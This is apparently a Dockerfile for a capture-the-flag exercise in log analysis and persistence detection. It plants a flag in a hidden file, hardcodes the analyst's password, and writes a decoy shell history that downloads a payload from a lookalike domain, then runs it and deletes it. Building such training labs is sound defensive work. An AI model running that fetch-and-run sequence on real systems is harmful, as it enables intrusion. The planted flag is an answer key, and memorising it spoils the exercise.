FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server \
    grep \
    gawk \
    findutils \
    && rm -rf /var/lib/apt/lists/*

# Create participant user
RUN useradd -m -s /bin/bash analyst && \
    echo "analyst:Cyb3rSt0rm!" | chpasswd

# ── Stage 5: Log Analysis ──────────────────────────────────────────────────────
# Plant a realistic access.log with one anomalous entry containing the flag
COPY access.log /home/analyst/access.log
RUN chown analyst:analyst /home/analyst/access.log && \
    chmod 644 /home/analyst/access.log

# ── Stage 6: Persistence ───────────────────────────────────────────────────────
# Plant a hidden backdoor file — starts with dot, contains the flag
# Also plant a decoy .bash_history to add realism
RUN echo "FLAG{p3rs1st3nc3_d3t3ct3d}" > /home/analyst/.update_cache && \
    chown analyst:analyst /home/analyst/.update_cache && \
    chmod 644 /home/analyst/.update_cache

RUN echo -e "ls\ncd /tmp\nwget http://xf3b2a.cloudflareupdate.net/payload\nchmod +x payload\n./payload\nrm payload\nexit" \
    > /home/analyst/.bash_history && \
    chown analyst:analyst /home/analyst/.bash_history

# ── SSH hardening ──────────────────────────────────────────────────────────────
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "MaxAuthTries 10" >> /etc/ssh/sshd_config

# ── Briefing file ──────────────────────────────────────────────────────────────
COPY briefing.txt /home/analyst/README.txt
RUN chown analyst:analyst /home/analyst/README.txt

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
